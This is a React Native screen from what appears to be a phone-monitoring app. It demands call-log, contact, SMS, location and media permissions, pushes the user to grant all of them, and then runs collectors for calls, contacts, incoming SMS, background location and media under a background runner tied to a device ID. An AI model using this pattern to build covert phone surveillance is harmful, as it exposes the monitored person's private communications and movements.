/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react-native/no-inline-styles */
import React, {useEffect, useState} from 'react';
import {
  Button,
  Linking,
  PermissionsAndroid,
  Platform,
  Text,
  View,
} from 'react-native';
import CallLog from '../../components/CallLog';
import {useStorage} from '../../hook/use-storage';
import {useNavigation} from '@react-navigation/native';
import Contact from '../../components/Contact';
import SmsListener from '../../components/SmsListener';
import Location from '../../components/Location';
import LocationBackground from '../../components/LocationBackground';
import {Runnable} from 'react-native-background-runner';
import {activeRunBackground} from '../../lib/helper';
import Media from '../../components/Media';
import {showAlert} from '../../lib/ui-alert';

const Permission = () => {
  const [deviceId, setDeviceId] = useStorage('deviceId');
  const [, setToken] = useStorage('token');
  const navigation = useNavigation();
  const [permissionsGranted, setPermissionsGranted] = useState(false);

  const requestAllPermissions = async () => {
    let listPermissions = [
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      PermissionsAndroid.PERMISSIONS.WRITE_CONTACTS,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
    ];
    if (+Platform.Version > 23) {
      listPermissions.push(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION);
    }

    if (+Platform.Version >= 33) {
      listPermissions = listPermissions.concat([
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
      ]);
    } else {
      listPermissions.push(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      );
    }

    if (Platform.OS === 'android') {
      PermissionsAndroid.requestMultiple(listPermissions).then(statuses => {
        const notHasPermissions = listPermissions.some(permission => {
          return statuses[permission] !== PermissionsAndroid.RESULTS.GRANTED;
        });

        if (notHasPermissions) {
          showAlert(
            'Please Go into Settings -> Applications -> Permissions and Allow all permissions to continue',
            {
              close: () => Linking.openSettings().then(),
              closeText: 'Open',
            },
          );
        } else {
          setPermissionsGranted(true);
        }
      });
    }
  };

  useEffect(() => {
    activeRunBackground();
    requestAllPermissions();
  }, []);

  return (
    <Runnable>
      <View
        style={{
          flex: 1,
          justifyContent: 'center',
          alignItems: 'center',
          gap: 16,
        }}>
        <Text>DeviceID: {deviceId}</Text>
        <Button
          title="Logout"
          onPress={() => {
            setDeviceId(null);
            setToken(null);
            navigation.navigate('Authentication' as never);
          }}
        />
        {permissionsGranted && (
          <View>
            <CallLog />
            <Contact />
            <SmsListener />
            {/* <Location /> */}
            <LocationBackground />
            <Media />
          </View>
        )}
      </View>
    </Runnable>
  );
};

export default Permission;
